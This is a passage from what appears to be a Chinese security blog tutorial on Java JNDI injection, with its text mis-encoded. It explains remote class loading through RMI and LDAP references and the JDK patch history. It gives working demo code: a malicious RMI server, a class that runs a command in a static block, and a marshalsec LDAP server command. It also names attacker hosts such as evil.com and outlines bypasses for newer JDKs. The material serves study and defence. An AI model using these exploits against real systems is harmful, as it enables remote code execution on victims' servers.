ç±»æˆ–è€…å…¶å­ç±»æ—¶ï¼Œåˆ™å¯ä»¥ä»å…¶ä»–æœåŠ¡å™¨ä¸ŠåŠ è½½æ¶æ„ <code>class</code> å­—èŠ‚ç æ–‡ä»¶æ¥å®ä¾‹åŒ– <code>Reference</code> ç±»å¸¸ç”¨å±æ€§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">className è¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å <br>classFactory åŠ è½½çš„ class ä¸­éœ€è¦å®ä¾‹åŒ–ç±»çš„åç§° <br>classFactoryLocation æä¾› classes æ•°æ®çš„åœ°å€å¯ä»¥æ˜¯ file/ftp/http ç­‰åè®®<br></code></pre></td></tr></table></figure><p>å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;http://evilHost/&quot;</span> ); <br>registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference));<br></code></pre></td></tr></table></figure><p>å‡å¦‚å®¢æˆ·ç«¯ä½¿ç”¨RMIåè®®ï¼Œlookupè¯·æ±‚æœåŠ¡ç«¯bindçš„Exploitç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>ctx.lookup(<span class="hljs-string">&quot;rmi://evilHost/Exploit&quot;</span>);<br></code></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯åœ¨æœ¬åœ° <code>CLASSPATH</code> æŸ¥æ‰¾ <code>Exploit</code> ç±»ï¼Œå¦‚æœæ²¡æœ‰åˆ™æ ¹æ®è®¾å®šçš„ <code>Reference</code> å±æ€§ï¼Œ</p><p>åˆ°<code>URL</code>ï¼š <code>http://evilHost/Exploit.class</code> è·å–æ„é€ å¯¹è±¡å®ä¾‹ï¼Œæ„é€ æ–¹æ³•ä¸­çš„æ¶æ„ä»£ç å°±ä¼šè¢«æ‰§è¡Œã€‚</p><h3 id="JNDI-References-æ³¨å…¥"><a href="#JNDI-References-æ³¨å…¥" class="headerlink" title="JNDI References æ³¨å…¥"></a>JNDI References æ³¨å…¥</h3><p>JNDIä¸­å¯¹è±¡çš„ä¼ é€’æœ‰ä¸¤ç§ï¼š</p><ul><li>åºåˆ—åŒ–</li><li>å¼•ç”¨</li></ul><p><strong>å¯¹äºå¼•ç”¨ï¼Œè‹¥å®¢æˆ·ç«¯<code>lookup()</code>çš„å†…å®¹å¯æ§ï¼Œæ§åˆ¶å®¢æˆ·ç«¯å»è®¿é—®æ¶æ„çš„æœåŠ¡ä¸­å¿ƒï¼ˆ<code>rmiã€ldap</code>ï¼‰ï¼Œè·å–æ¶æ„çš„å¼•ç”¨ï¼Œè¿›è€Œè·å–æ¶æ„è¿œç¨‹æœåŠ¡å™¨çš„æ¶æ„classæ–‡ä»¶è¿›è¡Œæ‰§è¡Œã€‚</strong></p><p><img src="/2024/07/30/JNDI/image-20240730204623748.png" alt="image-20240730204623748"></p><h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h4><ol><li>æ”»å‡»è€…é€šè¿‡å¯æ§çš„ URI å‚æ•°è§¦å‘åŠ¨æ€ç¯å¢ƒè½¬æ¢ï¼Œä¾‹å¦‚è¿™é‡Œ URI ä¸º <strong>rmi:&#x2F;&#x2F;evil.com:1099&#x2F;refObj</strong></li><li>åŸå…ˆé…ç½®å¥½çš„ä¸Šä¸‹æ–‡ç¯å¢ƒ ä¼šå› ä¸ºåŠ¨æ€ç¯å¢ƒè½¬æ¢è€Œè¢«æŒ‡å‘ <strong>rmi:&#x2F;&#x2F;evil.com:1099&#x2F;</strong></li><li>åº”ç”¨å» <strong>rmi:&#x2F;&#x2F;evil.com:1099</strong> è¯·æ±‚ç»‘å®šå¯¹è±¡ refObjï¼Œæ”»å‡»è€…äº‹å…ˆå‡†å¤‡å¥½çš„ RMI æœåŠ¡ä¼šè¿”å›ä¸åç§° refObj ç»‘å®šçš„ReferenceWrapper å¯¹è±¡</li><li>åº”ç”¨è·å–åˆ° ReferenceWrapper å¯¹è±¡å¼€å§‹ä»æœ¬åœ° <strong>CLASSPATH</strong> ä¸­æœç´¢ EvilObject ç±»ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¼šä»æ¶æ„è¿œç¨‹æœåŠ¡å™¨ä¸Šå»å°è¯•è·å– <strong>EvilObject.class</strong>ï¼Œå³åŠ¨æ€çš„å»è·å– <code>http://evil-cb.com/EvilObject.class</code></li><li>æ”»å‡»è€…äº‹å…ˆå‡†å¤‡å¥½çš„æœåŠ¡è¿”å›ç¼–è¯‘å¥½çš„åŒ…å«æ¶æ„ä»£ç çš„ <strong>EvilObject.class</strong></li><li>åº”ç”¨å¼€å§‹è°ƒç”¨ <strong>EvilObject</strong> ç±»çš„æ„é€ å‡½æ•°ï¼Œå› æ”»å‡»è€…äº‹å…ˆå®šä¹‰åœ¨æ„é€ å‡½æ•°ï¼Œè¢«åŒ…å«åœ¨é‡Œé¢çš„æ¶æ„ä»£ç è¢«æ‰§è¡Œ</li></ol><h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><ul><li>JDK 6u45ã€7u21ä¹‹åï¼šjava.rmi.server.useCodebaseOnly é»˜è®¤å€¼è¢«è®¾ç½®ä¸º trueã€‚å°†ç¦ç”¨è‡ªåŠ¨åŠ è½½è¿œç¨‹ç±»æ–‡ä»¶ï¼Œä»…ä»CLASSPATHå’Œå½“å‰JVMçš„java.rmi.server.codebaseæŒ‡å®šè·¯å¾„åŠ è½½ç±»æ–‡ä»¶ã€‚ä½¿ç”¨è¿™ä¸ªå±æ€§æ¥é˜²æ­¢å®¢æˆ·ç«¯JVMä»å…¶ä»–Codebaseåœ°å€ä¸ŠåŠ¨æ€åŠ è½½ç±»ï¼Œå¢åŠ äº†RMI ClassLoaderçš„å®‰å…¨æ€§ã€‚</li><li>JDK 6u132ã€7u122ã€8u113ä¹‹åï¼šå¢åŠ äº† com.sun.jndi.rmi.object.trustURLCodebase é€‰é¡¹ï¼Œé»˜è®¤ä¸º falseï¼Œç¦æ­¢RMIå’ŒCORBAåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼Œå› æ­¤RMIå’ŒCORBAåœ¨ä»¥ä¸Šçš„JDKç‰ˆæœ¬ä¸Šå·²ç»æ— æ³•è§¦å‘è¯¥æ¼æ´ï¼Œä½†ä¾ç„¶å¯ä»¥é€šè¿‡æŒ‡å®šURIä¸ºLDAPåè®®æ¥è¿›è¡ŒJNDIæ³¨å…¥æ”»å‡»ã€‚</li><li>JDK 6u211ã€7u201ã€8u191ä¹‹åï¼šå¢åŠ äº† com.sun.jndi.ldap.object.trustURLCodebase é€‰é¡¹ï¼Œé»˜è®¤ä¸º falseï¼Œç¦æ­¢LDAPåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼ŒæŠŠLDAPåè®®çš„æ”»å‡»é€”å¾„ä¹Ÿç»™ç¦äº†ã€‚</li></ul><p><img src="/2024/07/30/JNDI/image-20240730204805160.png" alt="image-20240730204805160"></p><p>å¯¹äºJNDIé«˜ç‰ˆæœ¬ç»•è¿‡ï¼Œå½“ç„¶ä¹Ÿæœ‰æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘å†åšå®¢å›­ä¹Ÿå†™è¿‡ï¼š</p><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943">ç»•è¿‡JDKé«˜ç‰ˆæœ¬é™åˆ¶è¿›è¡ŒJNDIæ³¨å…¥ - Eddie_Murphy - åšå®¢å›­ (cnblogs.com)</a></p><p>è¯¦ç»†çš„åé¢ä¹Ÿä¼šå†å†™å†™ã€‚</p><h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI-RMI"></a>JNDI-RMI</h3><h4 id="attack-1"><a href="#attack-1" class="headerlink" title="attack"></a>attack</h4><p>å†™ä¸ªæœ€åŸºç¡€çš„æ–¹å¼ï¼š</p><p>RMIServerï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>RMIClientï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rmi://127.0.0.1:1099/evil&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>calc.javaç¼–è¯‘ä¸ºclassæ–‡ä»¶ï¼Œ<code>python -m http.server 8080</code>èµ·WebæœåŠ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">calc</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯åŠ¨æœåŠ¡ç«¯ã€å®¢æˆ·ç«¯ï¼Œè§¦å‘å®¢æˆ·ç«¯å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">æ³¨ï¼šServerçš„urlç«¯å£åé¢ä¸€å®šè¦æœ‰æ–œçº¿ï¼ˆ/ï¼‰ï¼ï¼ï¼<br><br>è¿™é‡Œçš„æ¶æ„ç±»calc.javaå®é™…ä¸Šæœ€å¥½å®ç°javax.naming.spi.ObjectFactoryæ¥å£ï¼Œå¹¶é‡å†™getObjectInstanceæ–¹æ³•ï¼Œå¦åˆ™å®¢æˆ·ç«¯è¯·æ±‚å¾—åˆ°å­—èŠ‚ç æ–‡ä»¶åï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ï¼ˆå¯èƒ½å°±æ˜¯å› ä¸ºcalc.javaæ²¡æœ‰å®ç°ObjectFactoryæ¥å£ï¼‰<br></code></pre></td></tr></table></figure><h4 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h4><p>JDK 6u132ã€7u122ã€8u113ä¹‹åï¼šå¢åŠ äº† <code>com.sun.jndi.rmi.object.trustURLCodebase</code> é€‰é¡¹ï¼Œé»˜è®¤ä¸º falseï¼Œç¦æ­¢RMIå’ŒCORBAåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼Œå› æ­¤RMIå’ŒCORBAåœ¨ä»¥ä¸Šçš„JDKç‰ˆæœ¬ä¸Šå·²ç»æ— æ³•è§¦å‘è¯¥æ¼æ´ã€‚</p><p>åœ¨<code>RegistryContext</code>ä¸­ï¼Œä¼šåˆ¤æ–­ <code>trustURLCodebase</code>ï¼Œé»˜è®¤ä¸ºfalse</p><p><img src="/2024/07/30/JNDI/image-20240730210709177.png" alt="image-20240730210709177"></p><h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI-LDAP"></a>JNDI-LDAP</h3><h4 id="attack-2"><a href="#attack-2" class="headerlink" title="attack"></a>attack</h4><p><code>LDAP</code>æœåŠ¡ä¸­<code>lookup</code>æ–¹æ³•ä¸­æŒ‡å®šçš„è¿œç¨‹åœ°å€ä½¿ç”¨çš„æ˜¯<code>LDAP</code>åè®®ï¼Œç”±æ”»å‡»è€…æ§åˆ¶<code>LDAP</code>æœåŠ¡ç«¯è¿”å›ä¸€ä¸ªæ¶æ„<code>jndi Reference</code>å¯¹è±¡ï¼Œå¹¶ä¸”<code>LDAP</code>æœåŠ¡çš„<code>Reference</code>è¿œç¨‹åŠ è½½<code>Factory</code>ç±»å¹¶ä¸æ˜¯ä½¿ç”¨<code>RMI Class Loader</code>æœºåˆ¶ï¼Œå› æ­¤ä¸å—<code>trustURLCodebase</code>é™åˆ¶ã€‚</p><p>ldapçš„å®ç°ä»£ç è¾ƒå¤šï¼Œè¿™é‡Œä½¿ç”¨å·¥å…·<code>marshalsec</code>æ¥å¯åŠ¨LDAPæœåŠ¡</p><h4 id="marshalsecä¸‹è½½åŠä½¿ç”¨"><a href="#marshalsecä¸‹è½½åŠä½¿ç”¨" class="headerlink" title="marshalsecä¸‹è½½åŠä½¿ç”¨"></a>marshalsecä¸‹è½½åŠä½¿ç”¨</h4><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p><p>mavenæ‰“åŒ…ä¸ºjaråŒ…ï¼š<code>mvn clean package -DskipTests</code></p><p>é¡¹ç›®ä¼šå¤šå‡ºä¸€ä¸ªtargetç›®å½•ï¼Œè¿›å…¥å¯ä»¥çœ‹åˆ°ç”Ÿæˆçš„jaråŒ…</p><p>å¼€å¯ldapæœåŠ¡ï¼š<code>java -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#calc 8099</code></p><p>ä½œç”¨æ˜¯å°†LDAPæŸ¥è¯¢è¯·æ±‚é‡å®šå‘åˆ°<code>http://127.0.0.1:8000/#calc</code>ï¼Œcalcä¸ºæ¶æ„ä»£ç ç¼–è¯‘å¾—åˆ°çš„classæ–‡ä»¶</p><p><code>python -m http.server 8000</code>ä¸‹æ”¾calc.class</p><p><strong>æ³¨æ„ï¼šcalc.javaä¸è¦åŒ…å«åŒ…åï¼Œå¦åˆ™åœ¨è¿œç¨‹è°ƒç”¨çš„æ—¶å€™ä¼šå› ä¸ºç±»åä¸æ­£ç¡®è€ŒæŠ¥é”™</strong></p><p>å®¢æˆ·ç«¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:8099/aaa&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥è¯¢ldapçš„åœ°å€ä¸ºï¼š<code>ldap://127.0.0.1:8099/aaa</code>ï¼Œåé¢çš„aaaæ˜¯éšä¾¿å†™çš„ç”¨äºDNæŸ¥æ‰¾çš„å­—ç¬¦</p><p><img src="/2024/07/30/JNDI/image-20240730211225200.png" alt="image-20240730211225200"></p><p>è¿‡ç¨‹å…¶å®å°±æ˜¯</p><p><code>getObjectFactoryFromReference</code> &#x3D;&gt; <code>loadClass</code> &#x3D;&gt; æœ¬åœ°<code>AppClassLoader</code>æ‰¾ä¸åˆ° &#x3D;&gt; <code>URLClassLoader</code></p><h4 id="Patch-1"><a href="#Patch-1" class="headerlink" title="Patch"></a>Patch</h4><p>8u191ä¹‹åè¿›è¡Œäº†ä¿®è¡¥ï¼Œ loadClassæ–¹æ³•ä¸­æ·»åŠ  trustURLCodebase å±æ€§ï¼Œæ‰€ä»¥ä¸èƒ½è¿œç¨‹åŠ è½½äº†ã€‚</p><h2 id="JDK8u191åçš„JNDIæ³¨å…¥ç»•è¿‡"><a href="#JDK8u191åçš„JNDIæ³¨å…¥ç»•è¿‡" class="headerlink" title="JDK8u191åçš„JNDIæ³¨å…¥ç»•è¿‡"></a>JDK8u191åçš„JNDIæ³¨å…¥ç»•è¿‡</h2><p>å¯è§<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943">ç»•è¿‡JDKé«˜ç‰ˆæœ¬é™åˆ¶è¿›è¡ŒJNDIæ³¨å…¥ - Eddie_Murphy - åšå®¢å›­ (cnblogs.com)</a></p><p>é’ˆå¯¹8u191çš„ç»•è¿‡å¤§è‡´ä¸¤ç§é€”å¾„</p><ol><li>æ‰¾åˆ°ä¸€ä¸ªå—å®³è€…æœ¬åœ°<code>CLASSPATH</code>ä¸­çš„ç±»ä½œä¸ºæ¶æ„çš„<code>Reference Factory</code>å·¥å‚ç±»ï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªæœ¬åœ°çš„<code>Factory</code>ç±»æ‰§è¡Œå‘½ä»¤ã€‚</li><li>åˆ©ç”¨<code>LDAP</code>ç›´æ¥è¿”å›ä¸€ä¸ªæ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼ŒJNDIæ³¨å…¥ä¾ç„¶ä¼šå¯¹è¯¥å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œåˆ©ç”¨ååºåˆ—åŒ–<code>Gadget</code>å®Œæˆå‘½ä»¤æ‰§è¡Œã€‚</li></ol><ul><li>æ—¢ç„¶è¿œç¨‹ä¸èƒ½æ‰“ï¼Œå°±æ‰¾æœ¬åœ°æœ‰æ²¡æœ‰å¯åˆ©ç”¨çš„ç±»ã€‚æœåŠ¡ç«¯è¿”å›çš„<code>Reference</code>å¯¹è±¡ä¸­åŒ…å«æœ¬åœ°å­˜åœ¨çš„å¯åˆ©ç”¨<code>Factory</code>ç±»ï¼Œ<code>loadClass</code>åï¼Œåˆ›å»ºå®ä¾‹å¯¹è±¡ï¼Œè°ƒç”¨å…¶ <code>getObjectInstance</code> æ–¹æ³•ã€‚ï¼ˆè¯¥<code>Factory</code>ç±»éœ€è¦å®ç° <strong><code>javax.naming.spi.ObjectFactory</code></strong> æ¥å£ï¼Œè¿˜è¦é‡å†™å…¶ <code>getObjectInstance</code> æ–¹æ³•ï¼‰</li><li>é€šè¿‡LDAPçš„ <code>javaSerializedData</code>ååºåˆ—åŒ–<code>gadget</code>ã€‚LDAPæœåŠ¡ç«¯é™¤äº†æ”¯æŒ<code>JNDI Reference</code>è¿™ç§åˆ©ç”¨æ–¹å¼å¤–ï¼Œè¿˜æ”¯æŒç›´æ¥è¿”å›ä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ã€‚å¦‚æœJavaå¯¹è±¡çš„<code>javaSerializedData</code>å±æ€§å€¼ä¸ä¸ºç©ºï¼Œåˆ™å®¢æˆ·ç«¯çš„o<code>bj.decodeObject()</code>æ–¹æ³•å°±ä¼šå¯¹è¿™ä¸ªå­—æ®µçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ã€‚</li></ul><h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><p>Serverï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Test&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Clientå­˜åœ¨Factoryï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Name;<br><span class="hljs-keyword">import</span> javax.naming.spi.ObjectFactory;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Static Code&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Non-Arg Constructor&quot;</span>);<br>    &#125;<br><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;Constructor Code&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;getObjectInstance&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rmi://127.0.0.1:1099/evil&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢è¯´åˆ°Clientä¼šå…ˆå°è¯•æœ¬åœ°åŠ è½½ç±»ï¼Œå› æ­¤lookupè¯·æ±‚åï¼ŒåŠ è½½å¹¶å®ä¾‹åŒ–äº†Testç±»ã€‚</p><blockquote><p>Static Code Constructor Code Non-Arg Constructor getObjectInstance</p></blockquote><h3 id="æœ¬åœ°Classåˆ©ç”¨"><a href="#æœ¬åœ°Classåˆ©ç”¨" class="headerlink" title="æœ¬åœ°Classåˆ©ç”¨"></a>æœ¬åœ°Classåˆ©ç”¨</h3><p>ç›®å‰å…¬å¼€å¸¸ç”¨çš„åˆ©ç”¨æ–¹æ³•æ˜¯é€šè¿‡ <strong>Tomcat</strong> çš„ <strong>org.apache.naming.factory.BeanFactory</strong> å·¥å‚ç±»å»è°ƒç”¨ <strong>javax.el.ELProcessor#eval</strong> æ–¹æ³•æˆ– <strong>groovy.lang.GroovyShell#evaluate</strong> æ–¹æ³•</p><blockquote><p><code>org.apache.naming.factory.BeanFactory</code> åœ¨ <code>getObjectInstance()</code> ä¸­ä¼šé€šè¿‡åå°„çš„æ–¹å¼å®ä¾‹åŒ–<code>Reference</code>æ‰€æŒ‡å‘çš„<code>Bean Class</code>ï¼Œå¹¶ä¸”èƒ½è°ƒç”¨ä¸€äº›æŒ‡å®šçš„æ–¹æ³•</p></blockquote><p>è¦ä½¿ç”¨ <code>javax.el.ELProcessor</code>ï¼Œéœ€è¦ <code>Tomcat 8+</code>æˆ–<code>SpringBoot 1.2.x+</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 